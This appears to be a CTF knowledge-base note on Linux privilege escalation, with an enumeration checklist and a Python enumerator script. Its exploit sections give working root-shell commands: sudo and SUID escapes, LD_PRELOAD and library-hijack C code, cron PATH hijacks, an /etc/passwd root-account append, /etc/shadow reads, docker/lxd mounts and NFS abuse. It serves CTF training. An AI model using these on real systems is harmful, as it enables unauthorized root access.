---
title: "Linux Privilege Escalation for CTF Boxes"
category: misc
subcategory: privesc
type: technique
tags: [privesc, linux, suid, sgid, capabilities, sudo, gtfobins, cron, path-hijack, ld-preload, ld-library-path, writable-passwd, nfs-no-root-squash, linpeas, pspy, kernel-exploit, lxd]
difficulty: medium
summary: "Enumerate in a fixed order - id, sudo -l, SUID, capabilities, cron, writable PATH - then match the finding to a GTFOBins payload."
when_to_use:
  - "You have a user shell on a box and need root"
  - "A challenge gives you a SUID binary or a sudo rule"
  - "getcap shows cap_setuid on an interpreter"
  - "A cron job runs a script you can write to, or uses a relative command name"
tools: [linpeas, pspy, linux-exploit-suggester, gtfobins, find, getcap, sudo, gcc]
related: [shell-jail-escape, gtfobins-quickref, container-escape, misc-classics, ctf-general-cheatsheet]
---

## TL;DR

Run the enumeration in this order and stop at the first hit: `id` -> `sudo -l` -> SUID/SGID ->
file capabilities -> cron/timers -> writable PATH entries -> group memberships (docker, lxd,
disk, adm) -> writable `/etc/passwd` -> kernel version. Ninety percent of CTF boxes are solved
by one of the first six, and GTFOBins has the payload for every binary you will find.

## Recognise it

- `sudo -l` prints `(root) NOPASSWD: /usr/bin/<anything>`.
- `find / -perm -4000` lists a binary that is not in the default set.
- `getcap -r /` shows `cap_setuid+ep` on `python3`, `perl` or `node`.
- A cron entry runs a script in a directory you can write to.
- `ls -la /etc/passwd` shows it world-writable.
- You are in the `docker`, `lxd`, `disk` or `adm` group.

## Enumeration

```bash
# 0. who am I, and what is trivially available
id; whoami; groups; sudo -l; sudo -l -l
hostname; uname -a; cat /etc/os-release
cat /etc/passwd | grep -v nologin | grep -v false

# 1. SUID and SGID binaries (the -4000/-2000 bits)
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null
# compare against a known-good list: anything unusual is the answer

# 2. file capabilities
getcap -r / 2>/dev/null
# cap_setuid+ep on an interpreter is an instant root

# 3. writable files and directories that matter
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev|run)'
find /etc -writable -type f 2>/dev/null
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/crontab

# 4. scheduled jobs
cat /etc/crontab; ls -la /etc/cron.*; crontab -l
systemctl list-timers --all
ls -la /etc/systemd/system/ /lib/systemd/system/
# watch what actually runs (no root needed)
pspy64

# 5. processes and services
ps auxf; ps -eo pid,user,cmd --sort=start_time | tail -30
ss -lntup; netstat -tulpn
# services bound to 127.0.0.1 are often unauthenticated

# 6. interesting files
ls -la /home/*; ls -la ~/.ssh /root/.ssh 2>/dev/null
find / -name '*.bak' -o -name '*.old' -o -name '.env' 2>/dev/null | head -40
grep -rInE '(password|passwd|secret|api[_-]?key)\s*=' /var/www /opt /srv /home 2>/dev/null | head
cat ~/.bash_history ~/.mysql_history ~/.psql_history 2>/dev/null

# 7. mounts and disks
mount; cat /etc/fstab; lsblk; df -h
# no_root_squash on an NFS export = root on the client becomes root on the server

# 8. kernel and distro version for a public exploit
uname -r; cat /proc/version
searchsploit linux kernel $(uname -r | cut -d- -f1)

# 9. automated
./linpeas.sh -a | tee linpeas.txt
./linux-exploit-suggester.sh
```

## The exploit families

### sudo misconfigurations

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/find   -> GTFOBins:
sudo find . -exec /bin/sh \; -quit
# (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'
# (root) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/sh")}'
# a wildcard in the rule: (root) NOPASSWD: /usr/bin/tar -czf /tmp/b.tar.gz *
sudo tar -czf /tmp/b.tar.gz --checkpoint=1 --checkpoint-action=exec=/bin/sh
# env_keep += LD_PRELOAD  ->  load your own library into the setuid process
sudo LD_PRELOAD=/tmp/pre.so anything
# env_keep += LD_LIBRARY_PATH -> same idea with a replaced dependency
sudo LD_LIBRARY_PATH=/tmp anything
# SETENV in the rule allows you to pass env vars even without env_keep
sudo SETENV=1 ...
# sudoedit with a path you control, or sudo with a relative path
sudo -u#-1 /bin/bash            # CVE-2019-14287 when the rule is (ALL, !root)
```

### SUID binaries

```bash
# a SUID binary that calls another program by a RELATIVE name -> PATH hijack
strings /usr/local/bin/suidprog | grep -E '^[a-z]{2,12}$'
strace -f -e trace=execve /usr/local/bin/suidprog 2>&1 | grep exec
ltrace /usr/local/bin/suidprog 2>&1 | grep -E 'system|exec|popen'
# then:
echo -e '#!/bin/sh\n/bin/sh -p' > /tmp/ls && chmod +x /tmp/ls
export PATH=/tmp:$PATH && /usr/local/bin/suidprog

# a SUID binary that calls system("cmd") -> the same, plus shell metacharacter injection
# a SUID shell script: usually ignored by the kernel, but check for a wrapper

# note: bash drops privileges unless you use -p
/bin/bash -p
```

### File capabilities

```bash
getcap -r / 2>/dev/null
# cap_setuid+ep on python
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# cap_setuid+ep on perl
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
# cap_dac_read_search+ep on tar/python -> read any file
/usr/bin/python3 -c 'print(open("/etc/shadow").read())'
# cap_dac_override -> write any file (e.g. /etc/passwd)
```

### Cron and PATH

```bash
cat /etc/crontab
# PATH=/home/user/bin:/usr/bin ... and a job that runs `backup.sh` without a full path
mkdir -p /home/user/bin
printf '#!/bin/sh\ncp /bin/bash /tmp/rb; chmod +s /tmp/rb\n' > /home/user/bin/backup.sh
chmod +x /home/user/bin/backup.sh
# wait for the job, then:
/tmp/rb -p

# a cron job that runs a script you can write to
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' >> /opt/scripts/writable.sh

# a cron job with a wildcard: see shell-jail-escape for tar/chown/rsync argument injection
```

### LD_PRELOAD

Only useful when `sudo -l` shows `env_keep+=LD_PRELOAD`, or when a setuid binary is
non-standard (the dynamic loader ignores LD_PRELOAD for setuid binaries otherwise).

```c
/* pre.c - build with: gcc -fPIC -shared -o /tmp/pre.so /tmp/pre.c -nostartfiles */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init(void) {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
```

```bash
gcc -fPIC -shared -o /tmp/pre.so /tmp/pre.c -nostartfiles
sudo LD_PRELOAD=/tmp/pre.so apache2 -v     # any binary the sudo rule allows
```

### Library hijack (RPATH / missing .so)

```bash
# find a library the binary loads from a writable path
ldd /usr/local/bin/suidprog
objdump -x /usr/local/bin/suidprog | grep -E 'RPATH|RUNPATH'
# then compile a replacement exporting the same symbol
```

```c
/* hijack.c - gcc -shared -fPIC -o /path/libtarget.so hijack.c */
#include <stdlib.h>
static void __attribute__((constructor)) init(void) {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
```

### Group memberships

```bash
# docker group = root
docker run -v /:/host -it alpine chroot /host sh
# lxd/lxc group = root
lxc init ubuntu:18.04 x -c security.privileged=true
lxc config device add x host disk source=/ path=/mnt/root recursive=true
lxc start x && lxc exec x /bin/sh
# disk group = read the raw device
debugfs /dev/sda1
# adm group = read all logs
# video group = read the framebuffer (screenshots of a logged-in session)
```

### Writable /etc/passwd

```bash
# generate a hash and append a root-equivalent account
openssl passwd -1 -salt xx password123
echo 'hacker:$1$xx$....:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

### NFS no_root_squash

```bash
# on the target
cat /etc/exports        # look for no_root_squash
# on your box (as root)
mount -t nfs target:/share /mnt
cp /bin/bash /mnt/rb && chmod +s /mnt/rb
# back on the target
/share/rb -p
```

## Code

```python
#!/usr/bin/env python3
"""Linux privesc enumerator: the checks that matter, in priority order.

Read-only and dependency-free; safe to run on a target.

  python3 privesc_enum.py
  python3 privesc_enum.py --selftest
"""
from __future__ import annotations

import os
import re
import stat
import subprocess
import sys

# Binaries that are SUID on a normal system - anything else is worth investigating.
COMMON_SUID = {
    "ping", "ping6", "su", "sudo", "mount", "umount", "passwd", "chsh", "chfn",
    "gpasswd", "newgrp", "pkexec", "fusermount", "fusermount3", "ntfs-3g", "at",
    "chrome-sandbox", "dbus-daemon-launch-helper", "polkit-agent-helper-1",
    "ssh-keysign", "unix_chkpwd", "vmware-user-suid-wrapper", "Xorg.wrap", "snap-confine",
    "sudoedit", "expiry", "utempter",
}

# Binaries with a known GTFOBins shell escape - if one of these is SUID or in sudo -l, stop.
GTFOBINS_SHELL = {
    "awk", "base64", "bash", "busybox", "cat", "chmod", "chown", "cp", "curl", "cut",
    "dash", "date", "dd", "diff", "dmesg", "docker", "ed", "env", "expect", "file",
    "find", "flock", "ftp", "gawk", "gcc", "gdb", "git", "grep", "head", "ionice",
    "jq", "ksh", "ld.so", "less", "ltrace", "lua", "make", "man", "more", "mv",
    "mysql", "nano", "nc", "nice", "nmap", "node", "nohup", "openssl", "perl", "php",
    "pico", "pip", "python", "python2", "python3", "rlwrap", "rpm", "rsync", "ruby",
    "run-parts", "rvim", "scp", "screen", "sed", "setarch", "socat", "sort", "sqlite3",
    "ssh", "start-stop-daemon", "stdbuf", "strace", "systemctl", "tar", "taskset",
    "tclsh", "tcpdump", "tee", "time", "timeout", "tmux", "ul", "unshare", "vi", "vim",
    "watch", "wget", "xargs", "xxd", "zip", "zsh",
}

DANGEROUS_CAPS = {
    "cap_setuid": "call setuid(0) directly from the binary",
    "cap_setgid": "become any group",
    "cap_dac_read_search": "read any file on the system",
    "cap_dac_override": "write any file on the system",
    "cap_sys_admin": "mount, and much more",
    "cap_sys_ptrace": "attach to a root process",
    "cap_sys_module": "load a kernel module",
    "cap_chown": "chown any file",
    "cap_fowner": "bypass ownership checks on chmod",
}

DANGEROUS_GROUPS = {
    "docker": "docker run -v /:/host -it alpine chroot /host sh",
    "lxd": "lxc init ubuntu: x -c security.privileged=true; add a / disk device; lxc exec",
    "lxc": "same as lxd",
    "disk": "debugfs /dev/sda1 - raw read of the filesystem, including /etc/shadow",
    "adm": "read every log file",
    "shadow": "read /etc/shadow directly",
    "video": "read the framebuffer",
    "sudo": "check sudo -l",
    "wheel": "check sudo -l",
}


def run(cmd: list[str], timeout: int = 60) -> str:
    try:
        p = subprocess.run(cmd, capture_output=True, timeout=timeout)
    except (FileNotFoundError, subprocess.TimeoutExpired, PermissionError):
        return ""
    return (p.stdout + p.stderr).decode("utf-8", "replace")


def find_setuid(roots=("/usr", "/bin", "/sbin", "/opt", "/srv", "/home", "/var", "/tmp"),
                bits: int = stat.S_ISUID) -> list[str]:
    hits: list[str] = []
    for root in roots:
        if not os.path.isdir(root):
            continue
        for dirpath, dirnames, filenames in os.walk(root, onerror=lambda e: None):
            dirnames[:] = [d for d in dirnames if not os.path.islink(os.path.join(dirpath, d))]
            for name in filenames:
                path = os.path.join(dirpath, name)
                try:
                    st = os.lstat(path)
                except OSError:
                    continue
                if stat.S_ISLNK(st.st_mode) or not stat.S_ISREG(st.st_mode):
                    continue
                if st.st_mode & bits:
                    hits.append(path)
    return sorted(hits)


def classify_suid(paths: list[str]) -> list[str]:
    notes = []
    for p in paths:
        base = os.path.basename(p)
        if base in GTFOBINS_SHELL:
            notes.append(f"!! {p} - GTFOBins has a SUID shell payload for {base}")
        elif base not in COMMON_SUID:
            notes.append(f"?  {p} - not a standard SUID binary, reverse it "
                         f"(strings / ltrace / strace for relative command names)")
    return notes


def parse_getcap(output: str) -> list[str]:
    """Parse `getcap -r /` output and flag the dangerous capabilities."""
    notes = []
    for line in output.splitlines():
        m = re.match(r"^(\S+)\s+(?:=|cap_)", line)
        if not m:
            continue
        path = m.group(1)
        low = line.lower()
        for cap, why in DANGEROUS_CAPS.items():
            if cap in low:
                notes.append(f"!! {path} has {cap} -> {why}")
    return notes


def parse_sudo_l(output: str) -> list[str]:
    notes = []
    if "NOPASSWD" in output:
        for line in output.splitlines():
            if "NOPASSWD" in line:
                notes.append(f"!! sudo NOPASSWD rule: {line.strip()}")
                for b in GTFOBINS_SHELL:
                    if re.search(rf"/{re.escape(b)}\b", line):
                        notes.append(f"   -> {b} is in GTFOBins: `sudo {b} ...` gives a shell")
    if "env_keep" in output and "LD_PRELOAD" in output:
        notes.append("!! env_keep includes LD_PRELOAD -> compile a constructor .so and "
                     "run `sudo LD_PRELOAD=/tmp/pre.so <allowed binary>`")
    if "(ALL, !root)" in output or "!root" in output:
        notes.append("!! a negated-root rule: try `sudo -u#-1 <binary>` (CVE-2019-14287)")
    if re.search(r"NOPASSWD:[^\n]*\*", output):
        notes.append("!! the sudo rule contains a wildcard -> argument injection")
    return notes


def writable_path_dirs(path_env: str | None = None, uid: int | None = None) -> list[str]:
    """PATH entries this user can write to - a PATH hijack is then trivial."""
    path_env = path_env if path_env is not None else os.environ.get("PATH", "")
    out = []
    for d in path_env.split(":"):
        if not d:
            out.append("(empty PATH element = current directory!)")
            continue
        if os.path.isdir(d) and os.access(d, os.W_OK):
            out.append(d)
    del uid
    return out


def check_group_membership(groups: list[str]) -> list[str]:
    return [f"!! member of group {g}: {DANGEROUS_GROUPS[g]}"
            for g in groups if g in DANGEROUS_GROUPS]


def check_world_writable(paths=("/etc/passwd", "/etc/shadow", "/etc/sudoers",
                                "/etc/crontab", "/etc/sudoers.d")) -> list[str]:
    out = []
    for p in paths:
        try:
            st = os.stat(p)
        except OSError:
            continue
        if st.st_mode & stat.S_IWOTH:
            out.append(f"!! {p} is world-writable")
        elif os.access(p, os.W_OK):
            out.append(f"!! {p} is writable by this user")
    return out


def cron_notes() -> list[str]:
    out = []
    for path in ("/etc/crontab", "/etc/cron.d"):
        if not os.path.exists(path):
            continue
        files = [path] if os.path.isfile(path) else [
            os.path.join(path, f) for f in os.listdir(path)]
        for f in files:
            try:
                with open(f, encoding="utf-8", errors="replace") as fh:
                    content = fh.read()
            except OSError:
                continue
            for line in content.splitlines():
                if line.startswith("PATH="):
                    for d in line.split("=", 1)[1].split(":"):
                        if d and os.path.isdir(d) and os.access(d, os.W_OK):
                            out.append(f"!! cron PATH contains writable {d} ({f})")
                if line and not line.startswith("#") and " " in line:
                    m = re.search(r"\s(\S+\.(?:sh|py|pl))\b", line)
                    if m and os.path.exists(m.group(1)) and os.access(m.group(1), os.W_OK):
                        out.append(f"!! cron runs writable script {m.group(1)} ({f})")
    return out


def main() -> int:
    print("== identity ==")
    print(run(["id"]).strip() or f"uid={os.getuid()} gid={os.getgid()}")

    print("\n== sudo -l ==")
    sudo_out = run(["sudo", "-n", "-l"])
    print(sudo_out.strip() or "(no sudo, or a password is required)")
    for n in parse_sudo_l(sudo_out):
        print("  " + n)

    print("\n== SUID/SGID ==")
    suid = find_setuid()
    for n in classify_suid(suid) or ["  (nothing unusual)"]:
        print("  " + n)

    print("\n== capabilities ==")
    cap_out = run(["getcap", "-r", "/"], timeout=120)
    for n in parse_getcap(cap_out) or ["  (none dangerous)"]:
        print("  " + n)

    print("\n== writable PATH entries ==")
    for d in writable_path_dirs() or ["  (none)"]:
        print("  " + d)

    print("\n== groups ==")
    groups = run(["id", "-nG"]).split()
    for n in check_group_membership(groups) or ["  (nothing special)"]:
        print("  " + n)

    print("\n== sensitive file permissions ==")
    for n in check_world_writable() or ["  (ok)"]:
        print("  " + n)

    print("\n== cron ==")
    for n in cron_notes() or ["  (nothing writable)"]:
        print("  " + n)

    print("\n== kernel ==")
    print("  " + " ".join(os.uname()))
    return 0


def _selftest() -> None:
    # sudo -l parsing
    out = ("User u may run the following commands on box:\n"
           "    (root) NOPASSWD: /usr/bin/find\n"
           "    (root) NOPASSWD: /usr/bin/tar -czf /tmp/b.tgz *\n"
           "Matching Defaults entries:\n    env_reset, env_keep+=LD_PRELOAD\n")
    notes = parse_sudo_l(out)
    assert any("find is in GTFOBins" in n for n in notes), notes
    assert any("LD_PRELOAD" in n for n in notes), notes
    assert any("wildcard" in n for n in notes), notes
    assert parse_sudo_l("User u may run nothing\n") == []

    # getcap parsing
    cap = ("/usr/bin/python3.11 = cap_setuid+ep\n"
           "/usr/bin/ping = cap_net_raw+ep\n"
           "/usr/bin/tar cap_dac_read_search+ep\n")
    caps = parse_getcap(cap)
    assert any("python3.11" in c and "cap_setuid" in c for c in caps), caps
    assert any("tar" in c and "cap_dac_read_search" in c for c in caps), caps
    assert not any("ping" in c for c in caps), caps

    # SUID classification
    notes = classify_suid(["/usr/bin/passwd", "/usr/bin/find", "/opt/custom/backup"])
    assert not any("/usr/bin/passwd" in n for n in notes), notes
    assert any("/usr/bin/find" in n and "GTFOBins" in n for n in notes), notes
    assert any("/opt/custom/backup" in n and "not a standard" in n for n in notes), notes

    # writable PATH detection, including the empty element
    import tempfile
    tmp = tempfile.mkdtemp()
    dirs = writable_path_dirs(f"/nonexistent-xyz:{tmp}::/usr/bin")
    assert tmp in dirs, dirs
    assert any("empty PATH element" in d for d in dirs), dirs

    # group membership
    g = check_group_membership(["users", "docker", "audio"])
    assert len(g) == 1 and "docker run" in g[0], g

    # SUID discovery on a synthetic tree
    root = tempfile.mkdtemp()
    target = os.path.join(root, "vuln")
    with open(target, "w") as fh:
        fh.write("#!/bin/sh\n")
    os.chmod(target, 0o4755)
    found = find_setuid((root,))
    assert found == [target], found
    normal = os.path.join(root, "plain")
    with open(normal, "w") as fh:
        fh.write("x")
    os.chmod(normal, 0o644)
    assert normal not in find_setuid((root,))

    print(f"selftest ok: sudo/getcap/suid parsing, writable PATH, groups, "
          f"{len(GTFOBINS_SHELL)} gtfobins entries known")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--selftest":
        _selftest()
    else:
        sys.exit(main())
```

## Variants and pitfalls

- **`sudo -l` first, always.** It is one command and it solves a large fraction of boxes.
- **`/bin/bash` drops euid** unless you pass `-p`. A SUID shell that "does not work" usually
  just needs `bash -p` or a `setuid(0)` before the exec.
- **LD_PRELOAD is ignored for setuid binaries** by the dynamic loader. It only works through
  `sudo env_keep`, or on a non-setuid binary running as another user.
- **Compare SUID lists against a clean system.** `pkexec`, `passwd`, `mount` and friends are
  normal; `/opt/backup` is not.
- **`getcap -r /` is quiet but slow**; redirect stderr and be patient.
- **pspy shows cron jobs without root** and is often the only way to see a job that runs every
  minute with a writable script.
- **Kernel exploits are a last resort** in CTF: they are unreliable, noisy, and often crash the
  shared instance. Exhaust the misconfigurations first.
- **A writable `/etc/passwd`** is faster than shadow cracking: append your own root-uid entry.
- **Check `/var/backups`, `/opt`, `/srv`, and `/home/*/`** for credentials before anything
  exotic.
- **Restricted shells**: if `sudo -l` fails because you are in rbash, escape that first (see
  `shell-jail-escape`).
- **Containers**: if `/.dockerenv` exists, you want `container-escape`, not privesc.

## Tools

`linpeas` / `linenum` (enumeration), `pspy` (process watching without root),
`linux-exploit-suggester` (kernel CVE matching), `GTFOBins` (https://gtfobins.github.io/),
`getcap`/`setcap` (libcap), `strace`/`ltrace`, `gcc` for the preload/hijack libraries.

## References

- GTFOBins - per-binary sudo/SUID/file-read/file-write/shell payloads:
  https://gtfobins.github.io/
- Linux `capabilities(7)` manual page for file capabilities and their semantics.
- `sudoers(5)` manual page for `env_keep`, `SETENV`, `NOPASSWD` and the runas specification.
- `ld.so(8)` manual page for the `LD_PRELOAD` / `LD_LIBRARY_PATH` setuid restrictions.
